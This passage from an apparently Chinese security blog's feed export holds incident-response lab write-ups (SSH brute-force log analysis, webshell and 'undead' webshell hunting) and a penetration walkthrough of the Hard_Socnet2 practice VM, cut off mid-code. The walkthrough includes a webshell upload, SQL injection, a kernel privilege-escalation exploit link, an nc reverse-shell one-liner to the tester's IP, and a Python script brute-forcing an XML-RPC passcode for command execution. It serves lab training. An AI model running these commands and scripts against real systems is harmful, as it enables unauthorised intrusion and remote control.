class="line">flag提交顺序居然要这样</span><br></pre></td></tr></table></figure><h3 id="2-ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#2-ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h3><p>直接过滤 <strong>Accepted password</strong> </p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319203641751.png" alt="image-20240319203641751"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure><h3 id="3-爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#3-爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="3.爆破用户名字典是什么？如果有多个使用”,”分割"></a>3.爆破用户名字典是什么？如果有多个使用”,”分割</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319212743438.png" alt="image-20240319212743438"></p><blockquote><p>这里我的思考点是错的  一开始 想的爆破字典<br>就直接过滤了192.168.200.2<br>然后交了多次 然后全局看ssh日志文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure><h3 id="4-登陆成功的IP共爆破了多少次"><a href="#4-登陆成功的IP共爆破了多少次" class="headerlink" title="4.登陆成功的IP共爆破了多少次"></a>4.登陆成功的IP共爆破了多少次</h3><ul><li>查连接断开次数 <strong>Connection closed by authenticating</strong></li></ul><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319203537545.png" alt="image-20240319203537545"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure><h3 id="5-黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#5-黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="5.黑客登陆主机后新建了一个后门用户，用户名是多少"></a>5.黑客登陆主机后新建了一个后门用户，用户名是多少</h3><ul><li>查看&#x2F;etc&#x2F;passwd</li></ul><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319204325663.png" alt="image-20240319204325663"></p><p>能进行登陆的就只有 root、debian、test2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最终确定 主机后新建了一个test2后门用户</span><br></pre></td></tr></table></figure><ul><li>直接查看auth.log 过滤 <strong>new user</strong>亦可</li></ul><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319205607646.png" alt="image-20240319205607646"></p><blockquote><p>这题挺不错的 就是 美中不足的点是 flag的提交的顺序真的难受，<br>要按一定的顺序且是awk排的顺序  </p></blockquote><hr><blockquote><p>接下来就是跟着师傅使用awk、pwel环节</p></blockquote><h3 id="1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割-1"><a href="#1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割-1" class="headerlink" title="1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h3><p><code>cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319211908550.png" alt="image-20240319211908550"></p><h3 id="2-ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割-1"><a href="#2-ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割-1" class="headerlink" title="2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h3><p><code>cat /var/log/auth.log.1 | grep -a &quot;Accepted &quot; | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319212119501.png" alt="image-20240319212119501"></p><h3 id="3-爆破用户名字典是什么？如果有多个使用”-”分割-1"><a href="#3-爆破用户名字典是什么？如果有多个使用”-”分割-1" class="headerlink" title="3.爆破用户名字典是什么？如果有多个使用”,”分割"></a>3.爆破用户名字典是什么？如果有多个使用”,”分割</h3><p><code>cat /var/log/auth.log.1 | grep -a &quot;Failed password&quot; |perl -e &#39;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319212322450.png" alt="image-20240319212322450"></p><h3 id="4-登陆成功的IP共爆破了多少次-1"><a href="#4-登陆成功的IP共爆破了多少次-1" class="headerlink" title="4.登陆成功的IP共爆破了多少次"></a>4.登陆成功的IP共爆破了多少次</h3><p><code>cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319212520695.png" alt="image-20240319212520695"></p><hr><h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><p><code>grep -a &quot;Failed password for root&quot; /var/log/auth.log.1</code><br>该部分使用 grep 命令在文件 &#x2F;var&#x2F;log&#x2F;auth.log.1 中查找包含字符串 “Failed password for root” 的行<br> -a 选项表示以二进制模式处理文件，通常用于处理非文本文件</p><p><code>awk &#39;&#123;print $11&#125;&#39;</code><br>该部分使用 awk 命令从匹配到的行中提取出第11个字段，即IP地址<br>默认情况下，awk 以空格为字段分隔符，因此这里假设IP地址是在日志中的第11个字段</p><p><code>sort</code><br> 该部分使用 sort 命令对提取出的IP地址进行排序。这是为了让相同的IP地址相邻，以便后面的统计。</p><p><code>uniq -c</code><br>该部分使用<code>uniq -c</code>命令进行唯一性和计数，它会显示每个唯一的IP地址及其出现的次数<br>-c 选项用于显示每行重复出现的次数。</p><p><code>sort -nr</code><br>该部分使用 sort -nr 命令对计数结果进行排序，其中 -n 表示按数字顺序排序，-r 表示逆序（从高到低）排序</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一章-应急响应-Linux入侵排查</title>
      <link href="/2024/03/19/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
      <url>/2024/03/19/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">by:https://xj.edisec.net/challenges/26</span><br><span class="line">账号：root 密码：linuxruqin</span><br><span class="line">ssh root@IP</span><br><span class="line">1.web目录存在木马，请找到木马的密码提交</span><br><span class="line">2.服务器疑似存在不死马，请找到不死马的密码提交</span><br><span class="line">3.不死马是通过哪个文件生成的，请提交文件名</span><br><span class="line">4.黑客留下了木马文件，请找出黑客的服务器ip提交</span><br><span class="line">5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</span><br></pre></td></tr></table></figure><h3 id="1-web目录存在木马，请找到木马的密码提交"><a href="#1-web目录存在木马，请找到木马的密码提交" class="headerlink" title="1.web目录存在木马，请找到木马的密码提交"></a>1.web目录存在木马，请找到木马的密码提交</h3><p>查找webshell</p><p><code>ls</code> 发现有1.php  只是简单的一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1&#125;</span><br></pre></td></tr></table></figure><h3 id="2-服务器疑似存在不死马，请找到不死马的密码提交"><a href="#2-服务器疑似存在不死马，请找到不死马的密码提交" class="headerlink" title="2.服务器疑似存在不死马，请找到不死马的密码提交"></a>2.服务器疑似存在不死马，请找到不死马的密码提交</h3><p><code>grep -nr &quot;eval&quot; .</code> </p><p>发现存在.shell.php和index.php都是木马且有md5密码校验</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319194155774.png" alt="image-20240319194155774"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">拿去解md5 得到pass = hello</span><br><span class="line">flag&#123;hello&#125;</span><br></pre></td></tr></table></figure><h3 id="3-不死马是通过哪个文件生成的，请提交文件名"><a href="#3-不死马是通过哪个文件生成的，请提交文件名" class="headerlink" title="3.不死马是通过哪个文件生成的，请提交文件名"></a>3.不死马是通过哪个文件生成的，请提交文件名</h3><p>通过查看index.php可知有个循环一直生成.shell.php</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240318224245296.png" alt="image-20240318224245296"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;index.php&#125;</span><br></pre></td></tr></table></figure><h3 id="4-黑客留下了木马文件，请找出黑客的服务器ip提交"><a href="#4-黑客留下了木马文件，请找出黑客的服务器ip提交" class="headerlink" title="4.黑客留下了木马文件，请找出黑客的服务器ip提交"></a>4.黑客留下了木马文件，请找出黑客的服务器ip提交</h3><h4 id="两种方法"><a href="#两种方法" class="headerlink" title="两种方法"></a>两种方法</h4><ul><li><p>使用情报社区</p><p>  <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240318225533590.png" alt="image-20240318225533590"></p></li><li><p>运行查看端口</p><p>  <code>chmod 777 shell\(1\).elf</code></p><p>  <code>./shell\(1\).elf</code></p><p>  <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240318225906247.png" alt="image-20240318225906247"><code>netstat -ano</code></p><p>  <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240318230107869.png" alt="image-20240318230107869"></p><p>  查看前后  这个是新增的 由此可确定</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;10.11.55.21&#125;</span><br></pre></td></tr></table></figure><h3 id="5-黑客留下了木马文件，请找出黑客服务器开启的监端口提交"><a href="#5-黑客留下了木马文件，请找出黑客服务器开启的监端口提交" class="headerlink" title="5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交"></a>5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br><span class="line">flag&#123;3333&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一章-应急响应-webshell查杀</title>
      <link href="/2024/03/19/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/"/>
      <url>/2024/03/19/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">by:https://xj.edisec.net/challenges/25</span><br><span class="line">靶机账号密码 root xjwebshell</span><br><span class="line">1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;</span><br><span class="line">2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;</span><br><span class="line">3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx</span><br><span class="line">4.黑客免杀马完整路径 md5 flag&#123;md5&#125;</span><br></pre></td></tr></table></figure><h3 id="1-黑客webshell里面的flag"><a href="#1-黑客webshell里面的flag" class="headerlink" title="1.黑客webshell里面的flag"></a>1.黑客webshell里面的flag</h3><p>查找webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -nr &quot;eval&quot; .</span><br></pre></td></tr></table></figure><p>然后发现  &#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;gz.php</p><p>还有一个隐藏的shell</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure><h3 id="2-黑客使用的什么工具的shell"><a href="#2-黑客使用的什么工具的shell" class="headerlink" title="2.黑客使用的什么工具的shell"></a>2.黑客使用的什么工具的shell</h3><p>webshell分析<br>拿去分析<br>可知是哥斯拉<br><a href="https://github.com/BeichenDream/Godzilla">BeichenDream&#x2F;Godzilla: 哥斯拉 (github.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;date&quot; |md5sum |cut -d &quot; &quot; -f1</span><br><span class="line">flag&#123;39392de3218c333f794befef07ac9257&#125;</span><br></pre></td></tr></table></figure><h3 id="3-黑客隐藏shell的完整路径的md5-flag-md5"><a href="#3-黑客隐藏shell的完整路径的md5-flag-md5" class="headerlink" title="3.黑客隐藏shell的完整路径的md5 flag{md5}"></a>3.黑客隐藏shell的完整路径的md5 flag{md5}</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br><span class="line">/var/www/html/include/Db/.Mysqli.php</span><br><span class="line">flag&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;</span><br></pre></td></tr></table></figure><h3 id="4-黑客免杀马完整路径"><a href="#4-黑客免杀马完整路径" class="headerlink" title="4.黑客免杀马完整路径"></a>4.黑客免杀马完整路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/wap/top.php</span><br><span class="line">查看日志</span><br><span class="line">/var/log/apache2/access.log   发现有RCE 跟进分析</span><br><span class="line">flag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hard_Socnet2</title>
      <link href="/2024/02/22/Hard-Socnet2/"/>
      <url>/2024/02/22/Hard-Socnet2/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">渗透机：192.168.50.216</span><br><span class="line">靶机：192.168.50.43</span><br></pre></td></tr></table></figure><h2 id="端口探针"><a href="#端口探针" class="headerlink" title="端口探针"></a>端口探针</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.50.43</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165250319.png" alt="image-20240222165250319"></p><h2 id="服务探针"><a href="#服务探针" class="headerlink" title="服务探针"></a>服务探针</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80,8000 -sV 192.168.50.43</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165511515.png" alt="image-20240222165511515"></p><blockquote><p>可知 80端口是一个Apache的一个Web页面；</p><p>8000端口是一个python开的一个Web服务</p><p>通过对80 8000 端口的分别访问  80是一个登陆界面  8000 501报错</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165704606.png" alt="image-20240222165704606"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165716873.png" alt="image-20240222165716873"></p><p>根据报错：请求方式错误</p><p>可以尝试抓包改请求方式，看服务端支持哪种请求方式</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222170236748.png" alt="image-20240222170236748"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过尝试常见的请求方法 探针可用的方法（这里没有探针出来，但是提供思路点）</span><br><span class="line">OPTIONS GET POST PUT DELETE</span><br></pre></td></tr></table></figure><p>很显然8000端口目前没有可利用点</p><p>继续回到80端口</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222171317964.png" alt="image-20240222171317964"></p><p>可知需要Email和Password 才可登陆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">尝试万能密码去尝试之后 发现 登陆不进去 发现还是要知道邮箱然后进行登陆</span><br><span class="line">目前所获得的信息 显然达不到爆破进入管理员后台</span><br><span class="line">Login页面旁的Sign Up 注册用户  是可以利用的一个点创建一个用户 </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222171925374.png" alt="image-20240222171925374"></p><p>发现可以任意用户创建登陆后台</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222172256631.png" alt="image-20240222172256631"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222172419126.png" alt="image-20240222172419126"></p><blockquote><p>可以知道存在 admin 用户 </p><p>根据admin用户发布的文章可推测服务器存在一个python的脚本文件</p><p>可能存在利用点</p></blockquote><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222172907773.png" alt="image-20240222172907773"></p><p>看了各种admin用户文章并没得到admin的邮箱</p><p>通过尝试各种功能点，发现一个文件上传功能点</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222173510469.png" alt="image-20240222173510469"></p><p>成功上传且抓包过程中就能知道 文件上传所在位置</p><p>（或者在头像处也可复制SHELL地址访问）</p><p>然后用蚁剑连接尝试</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222173756541.png" alt="image-20240222173756541"></p><p>连接成功</p><p>通过文件上传即可拿到低权限shell</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222175354683.png" alt="image-20240222175354683"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a    查看详细版本信息</span><br></pre></td></tr></table></figure><hr><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><blockquote><p>只是能够得到admin邮箱从而登陆admin账号</p><p>通过后台拿shell的权限是一样的</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222174051885.png" alt="image-20240222174051885"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索的表单提交含有SQL注入</span><br></pre></td></tr></table></figure><blockquote><p>通过SQL注入可以注入出admin的邮箱及密码</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222175015454.png" alt="image-20240222175015454"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="提权一：内核提权"><a href="#提权一：内核提权" class="headerlink" title="提权一：内核提权"></a>提权一：内核提权</h2><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222222943050.png" alt="image-20240222222943050"></p><h3 id="CVE-2021-3493"><a href="#CVE-2021-3493" class="headerlink" title="CVE-2021-3493"></a>CVE-2021-3493</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222175903488.png" alt="image-20240222175903488"></p><blockquote><p>通过返回来的命令 看起来已经成功了 </p><p>可能已经提权成功了(可能：蚁剑SHELL不全所造成退出)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反弹shell  nc版本不支持-e参数 可尝试串联shell</span><br><span class="line">或者</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.50.216 6666 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222180952995.png" alt="image-20240222180952995"></p><h2 id="提权二：缓冲区溢出提权"><a href="#提权二：缓冲区溢出提权" class="headerlink" title="提权二：缓冲区溢出提权"></a>提权二：缓冲区溢出提权</h2><h3 id="XMLRPC模块"><a href="#XMLRPC模块" class="headerlink" title="XMLRPC模块"></a>XMLRPC模块</h3><p><a href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">xmlrpc — XMLRPC 服务端与客户端模块 — Python 3.12.2 文档</a></p><blockquote><p>XML-RPC 是一种远程过程调用方法，它使用通过 HTTP 传递的 XML 作为载体。 有了它，客户端可以在远程服务器上调用带参数的方法（服务器以 URI 命名）并获取结构化的数据。</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222191220107.png" alt="image-20240222191220107"></p><p>查看可登陆的用户，去到它的家目录  </p><p>发现存在 monitor.py  这对应了管理员发的文章,查看进程看脚本是否运行</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222191507132.png" alt="image-20240222191507132"></p><p>可知 该程序是正在运行的 由于是python 又可以直接进入socnet目录查看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runcmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mem</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disk</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">net</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>根据服务器代码写出发送请求代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://192.168.50.43:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(proxy.net()))</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222194313769.png" alt="image-20240222194313769"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line">        </span><br><span class="line">该方法 可以自定义代码进行RCE 前提是 要知道 passcode        </span><br></pre></td></tr></table></figure><p>由于 passcode&#x3D;&#x3D;debugging_pass；</p><p>而debugging_pass &#x3D; random.randint(1000,9999)</p><p>故可以尝试 暴力破解 passcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://192.168.50.43:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>,<span class="number">9999</span>):</span><br><span class="line">        r = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&#x27;whoami&#x27;</span>,i))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(r)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222195012112.png" alt="image-20240222195012112"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成功爆破出passcode 9935  也成功执行了whoami命令</span><br></pre></td></tr></table></figure><h3 id="反弹shell得到socnet权限"><a href="#反弹shell得到socnet权限" class="headerlink" title="反弹shell得到socnet权限"></a>反弹shell得到socnet权限</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 